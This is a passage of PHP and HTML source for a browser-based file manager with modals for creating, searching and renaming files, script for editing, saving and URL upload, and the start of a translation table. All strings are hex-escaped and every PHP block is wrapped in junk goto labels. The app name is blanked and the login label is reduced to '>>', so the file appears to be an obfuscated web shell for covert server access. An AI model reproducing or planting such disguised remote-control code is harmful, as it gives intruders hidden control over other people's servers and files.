<body class="<?php goto opet_1d2e4; opet_1d2e4: echo (FM_THEME == "\x64\141\x72\153") ? "\x74\150\x65\155\x65\055\x64\141\x72\153" : ""; ?> <?php goto opet_1d2e6; opet_1d2e6: echo $isStickyNavBar; ?>">
<div id="wrapper" class="container-fluid">
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php goto opet_1d2e7; opet_1d2e7: echo fm_get_theme(); ?>" method="post">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php goto opet_1d2eb; opet_1d2eb: echo lng("\x43\162\x65\141\x74\145\x4E\145\x77\111\x74\145\x6D") ?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php goto opet_1d2ee; opet_1d2ee: echo lng("\x74\171\x70\145") ?> </label></p>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                      <label class="form-check-label" for="customRadioInline1"><?php goto opet_1d2f0; opet_1d2f0: echo lng("\x46\151\x6C\145") ?></label>
                    </div>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                      <label class="form-check-label" for="customRadioInline2"><?php goto opet_1d2f3; opet_1d2f3: echo lng("\x46\157\x6C\144\x65\162") ?></label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php goto opet_1d2f6; opet_1d2f6: echo lng("\x6E\141\x6D\145") ?> </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php goto opet_1d2fa; opet_1d2fa: echo lng("\x45\156\x74\145\x72\040\x68\145\x72\145\x2E\056\x2E") ?>" required>
                </div>
                <div class="modal-footer">
                    <input type="hidden" name="token" value="<?php goto opet_1d2fd; opet_1d2fd: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php goto opet_1d300; opet_1d300: echo lng("\x43\141\x6E\143\x65\154") ?></button>
                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php goto opet_1d304; opet_1d304: echo lng("\x43\162\x65\141\x74\145\x4E\157\x77") ?></button>
                </div>
            </form>
        </div>
    </div>

    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php goto opet_1d305; opet_1d305: echo fm_get_theme(); ?>">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group mb-3">
                  <input type="text" class="form-control" placeholder="<?php goto opet_1d308; opet_1d308: echo lng("\x53\145\x61\162\x63\150") ?> <?php goto opet_1d30b; opet_1d30b: echo lng("\x61\040\x66\151\x6C\145\x73") ?>" aria-label="<?php goto opet_1d30e; opet_1d30e: echo lng("\x53\145\x61\162\x63\150") ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                </div>
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2"><?php goto opet_1d317; opet_1d317: echo lng("\x53\145\x61\162\x63\150\x20\146\x69\154\x65\040\x69\156\x20\146\x6F\154\x64\145\x72\040\x61\156\x64\040\x73\165\x62\146\x6F\154\x64\145\x72\163\x2E\056\x2E") ?></p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php goto opet_1d318; opet_1d318: echo fm_get_theme(); ?>" method="post" autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php goto opet_1d31f; opet_1d31f: echo lng("\x41\162\x65\040\x79\157\x75\040\x73\165\x72\145\x20\167\x61\156\x74\040\x74\157\x20\162\x65\156\x61\155\x65\077") ?></h5>
            <p class="mb-1">
                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php goto opet_1d325; opet_1d325: echo lng("\x45\156\x74\145\x72\040\x6E\145\x77\040\x66\151\x6C\145\x20\156\x61\155\x65") ?>" required>
                <input type="hidden" name="token" value="<?php goto opet_1d327; opet_1d327: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                <input type="hidden" name="rename_from" id="js-rename-from">
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php goto opet_1d32a; opet_1d32a: echo lng("\x43\141\x6E\143\x65\154") ?></button>
            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php goto opet_1d32d; opet_1d32d: echo lng("\x4F\153\x61\171") ?></strong></button>
          </div>
        </form>
      </div>
    </div>

    <script type="text/html" id="js-tpl-confirm">
        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
          <div class="modal-dialog" role="document">
            <form class="modal-content rounded-3 shadow <?php goto opet_1d32f; opet_1d32f: echo fm_get_theme(); ?>" method="post" autocomplete="off" action="<%this.action%>">
              <div class="modal-body p-4 text-center">
                <h5 class="mb-2"><?php goto opet_1d334; opet_1d334: echo lng("\x41\162\x65\040\x79\157\x75\040\x73\165\x72\145\x20\167\x61\156\x74\040\x74\157") ?> <%this.title%> ?</h5>
                <p class="mb-1"><%this.content%></p>
              </div>
              <div class="modal-footer flex-nowrap p-0">
                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php goto opet_1d337; opet_1d337: echo lng("\x43\141\x6E\143\x65\154") ?></button>
                <input type="hidden" name="token" value="<?php goto opet_1d33a; opet_1d33a: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php goto opet_1d33c; opet_1d33c: echo lng("\x4F\153\x61\171") ?></strong></button>
              </div>
            </form>
          </div>
        </div>
    </script>

    <?php goto opet_1d33e; opet_1d33e: }
    function fm_show_footer()
    { ?>
</div>
<?php goto opet_1d341; opet_1d341: print_external("\x6A\163\x2D\152\x71\165\x65\162\x79"); ?>
<?php goto opet_1d345; opet_1d345: print_external("\x6A\163\x2D\142\x6F\157\x74\163\x74\162\x61\160"); ?>
<?php goto opet_1d34b; opet_1d34b: print_external("\x6A\163\x2D\152\x71\165\x65\162\x79\055\x64\141\x74\141\x74\141\x62\154\x65\163"); ?>
<?php goto opet_1d34e; opet_1d34e: if (FM_USE_HIGHLIGHTJS && isset($_GET["\x76\151\x65\167"])): ?>
    <?php goto opet_1d352; opet_1d352: print_external("\x6A\163\x2D\150\x69\147\x68\154\x69\147\x68\164\x6A\163"); ?>
    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
<?php goto opet_1d353; opet_1d353: endif; ?>
<script>
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) {
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState && 200 == n.status && toast(n.responseText)
        }, n.send(a), !1
    }
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (typeof n !== 'undefined' && n !== null) {
            if (true) {
                var data = {ajax: true, content: n, type: 'save', token: window.csrf};

                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: JSON.stringify(data),
                    contentType: "application/json; charset=utf-8",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
            } else {
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
            }
        }
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    function fm_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt && searchTxt.length > 2 && path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data && data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }
    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
        e.preventDefault();
        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
        let tpl = $("#js-tpl-confirm").html();
        $(".modal.confirmDailog").remove();
        $('#wrapper').append(template(tpl,tplObj));
        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
        $confirmDailog.modal('show');
        return false;
    }
    

    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);
    $(document).ready( function () {
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
        });
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { fm_search(); }
        });
        $('#search-addon3').on( 'click', function () { fm_search(); });
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php goto opet_1d35c; opet_1d35c: if (isset($_GET["\x65\144\x69\164"]) && isset($_GET["\x65\156\x76"]) && FM_EDIT_FILE && !FM_READONLY):
        
        $ext = pathinfo($_GET["\x65\144\x69\164"], PATHINFO_EXTENSION);
        $ext =  $ext == "\x6A\163" ? "\x6A\141\x76\141\x73\143\x72\151\x70\164" :  $ext; ?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php goto opet_1d360; opet_1d360: echo $ext; ?>", inline:true} );
        editor.setTheme("ace/theme/dracula");
        editor.setShowPrintMargin(false);
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change();
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue && cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue && selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue && selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue && selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue));
                }
            });
        });
    </script>
<?php goto opet_1d362; opet_1d362: endif; ?>
<div id="snackbar"></div>
</body>
</html>
<?php goto opet_1d614; opet_1d614: }

function lng($txt) {
    global $lang;

    $tr["\x65\156"]["\x41\160\x70\116\x61\155\x65"]        = "";                       $tr["\x65\156"]["\x41\160\x70\124\x69\164\x6C\145"]           = "";
    $tr["\x65\156"]["\x4C\157\x67\151\x6E"]          = "\x3E\076";                     $tr["\x65\156"]["\x55\163\x65\162\x6E\141\x6D\145"]           = "\x55\163\x65\162\x6E\141\x6D\145";
    $tr["\x65\156"]["\x50\141\x73\163\x77\157\x72\144"]       = "\x50\141\x73\163\x77\157\x72\144";               $tr["\x65\156"]["\x4C\157\x67\157\x75\164"]             = "\x4C\157\x67\157\x75\164";
    $tr["\x65\156"]["\x4D\157\x76\145"]           = "\x4D\157\x76\145";                   $tr["\x65\156"]["\x43\157\x70\171"]               = "\x43\157\x70\171";
    $tr["\x65\156"]["\x53\141\x76\145"]           = "\x53\141\x76\145";                   $tr["\x65\156"]["\x53\145\x6C\145\x63\164\x41\154\x6C"]          = "\x53\145\x6C\145\x63\164\x20\141\x6C\154";
    $tr["\x65\156"]["\x55\156\x53\145\x6C\145\x63\164\x41\154\x6C"]    = "\x55\156\x73\145\x6C\145\x63\164\x20\141\x6C\154";           $tr["\x65\156"]["\x46\151\x6C\145"]               = "\x46\151\x6C\145";
    $tr["\x65\156"]["\x42\141\x63\153"]           = "\x42\141\x63\153";                   $tr["\x65\156"]["\x53\151\x7A\145"]               = "\x53\151\x7A\145";
    $tr["\x65\156"]["\x50\145\x72\155\x73"]          = "\x50\145\x72\155\x73";                  $tr["\x65\156"]["\x4D\157\x64\151\x66\151\x65\144"]           = "\x4D\157\x64\151\x66\151\x65\144";
    $tr["\x65\156"]["\x4F\167\x6E\145\x72"]          = "\x4F\167\x6E\145\x72";                  $tr["\x65\156"]["\x53\145\x61\162\x63\150"]             = "\x53\145\x61\162\x63\150";
    $tr["\x65\156"]["\x4E\145\x77\111\x74\145\x6D"]        = "\x4E\145\x77\040\x49\164\x65\155";               $tr["\x65\156"]["\x46\157\x6C\144\x65\162"]             = "\x46\157\x6C\144\x65\162";
    $tr["\x65\156"]["\x44\145\x6C\145\x74\145"]         = "\x44\145\x6C\145\x74\145";                 $tr["\x65\156"]["\x52\145\x6E\141\x6D\145"]             = "\x52\145\x6E\141\x6D\145";
    $tr["\x65\156"]["\x43\157\x70\171\x54\157"]         = "\x43\157\x70\171\x20\164\x6F";                $tr["\x65\156"]["\x44\151\x72\145\x63\164\x4C\151\x6E\153"]         = "\x44\151\x72\145\x63\164\x20\154\x69\156\x6B";
    $tr["\x65\156"]["\x55\160\x6C\157\x61\144\x69\156\x67\106\x69\154\x65\163"] = "\x55\160\x6C\157\x61\144\x20\106\x69\154\x65\163";           $tr["\x65\156"]["\x43\150\x61\156\x67\145\x50\145\x72\155\x69\163\x73\151\x6F\156\x73"]  = "\x43\150\x61\156\x67\145\x20\120\x65\162\x6D\151\x73\163\x69\157\x6E\163";
    $tr["\x65\156"]["\x43\157\x70\171\x69\156\x67"]        = "\x43\157\x70\171\x69\156\x67";                $tr["\x65\156"]["\x43\162\x65\141\x74\145\x4E\145\x77\111\x74\145\x6D"]      = "\x43\162\x65\141\x74\145\x20\116\x65\167\x20\111\x74\145\x6D";
    $tr["\x65\156"]["\x4E\141\x6D\145"]           = "\x4E\141\x6D\145";                   $tr["\x65\156"]["\x41\144\x76\141\x6E\143\x65\144\x45\144\x69\164\x6F\162"]     = "\x41\144\x76\141\x6E\143\x65\144\x20\105\x64\151\x74\157\x72";
    $tr["\x65\156"]["\x41\143\x74\151\x6F\156\x73"]        = "\x41\143\x74\151\x6F\156\x73";                $tr["\x65\156"]["\x46\157\x6C\144\x65\162\x20\151\x73\040\x65\155\x70\164\x79"]    = "\x46\157\x6C\144\x65\162\x20\151\x73\040\x65\155\x70\164\x79";
    $tr["\x65\156"]["\x55\160\x6C\157\x61\144"]         = "\x55\160\x6C\157\x61\144";                 $tr["\x65\156"]["\x43\141\x6E\143\x65\154"]             = "\x43\141\x6E\143\x65\154";
    $tr["\x65\156"]["\x49\156\x76\145\x72\164\x53\145\x6C\145\x63\164\x69\157\x6E"]= "\x49\156\x76\145\x72\164\x20\123\x65\154\x65\143\x74\151\x6F\156";       $tr["\x65\156"]["\x44\145\x73\164\x69\156\x61\164\x69\157\x6E\106\x6F\154\x64\145\x72"]  = "\x44\145\x73\164\x69\156\x61\164\x69\157\x6E\040\x46\157\x6C\144\x65\162";
    $tr["\x65\156"]["\x74\171\x70\145"]           = "\x74\171\x70\145";                   $tr["\x65\156"]["\x6E\141\x6D\145"]               = "\x6E\141\x6D\145";
    $tr["\x65\156"]["\x43\162\x65\141\x74\145\x4E\157\x77"]      = "\x43\162\x65\141\x74\145\x20\116\x6F\167";             $tr["\x65\156"]["\x44\157\x77\156\x6C\157\x61\144"]           = "\x44\157\x77\156\x6C\157\x61\144";
    $tr["\x65\156"]["\x4F\160\x65\156"]           = "\x4F\160\x65\156";                   $tr["\x65\156"]["\x55\156\x5A\151\x70"]              = "\x55\156\x5A\151\x70";
    $tr["\x65\156"]["\x55\156\x5A\151\x70\124\x6F\106\x6F\154\x64\145\x72"]  = "\x55\156\x5A\151\x70\040\x74\157\x20\146\x6F\154\x64\145\x72";        $tr["\x65\156"]["\x45\144\x69\164"]               = "\x45\144\x69\164";
    $tr["\x65\156"]["\x4E\157\x72\155\x61\154\x45\144\x69\164\x6F\162"]   = "\x4E\157\x72\155\x61\154\x20\105\x64\151\x74\157\x72";          $tr["\x65\156"]["\x42\141\x63\153\x55\160"]             = "\x42\141\x63\153\x20\125\x70";
    $tr["\x65\156"]["\x53\157\x75\162\x63\145\x46\157\x6C\144\x65\162"]   = "\x53\157\x75\162\x63\145\x20\106\x6F\154\x64\145\x72";          $tr["\x65\156"]["\x46\151\x6C\145\x73"]              = "\x46\151\x6C\145\x73";
    $tr["\x65\156"]["\x4D\157\x76\145"]           = "\x4D\157\x76\145";                   $tr["\x65\156"]["\x43\150\x61\156\x67\145"]             = "\x43\150\x61\156\x67\145";
    $tr["\x65\156"]["\x53\145\x74\164\x69\156\x67\163"]       = "\x53\145\x74\164\x69\156\x67\163";               $tr["\x65\156"]["\x4C\141\x6E\147\x75\141\x67\145"]           = "\x4C\141\x6E\147\x75\141\x67\145";        
    $tr["\x65\156"]["\x45\162\x72\157\x72\122\x65\160\x6F\162\x74\151\x6E\147"] = "\x45\162\x72\157\x72\040\x52\145\x70\157\x72\164\x69\156\x67";        $tr["\x65\156"]["\x53\150\x6F\167\x48\151\x64\144\x65\156\x46\151\x6C\145\x73"]    = "\x53\150\x6F\167\x20\110\x69\144\x64\145\x6E\040\x46\151\x6C\145\x73";
    $tr["\x65\156"][""]               = "";                       $tr["\x65\156"]["\x43\162\x65\141\x74\145\x64"]            = "\x43\162\x65\141\x74\145\x64";
    $tr["\x65\156"][""]               = "";                       $tr["\x65\156"][""]                   = "";
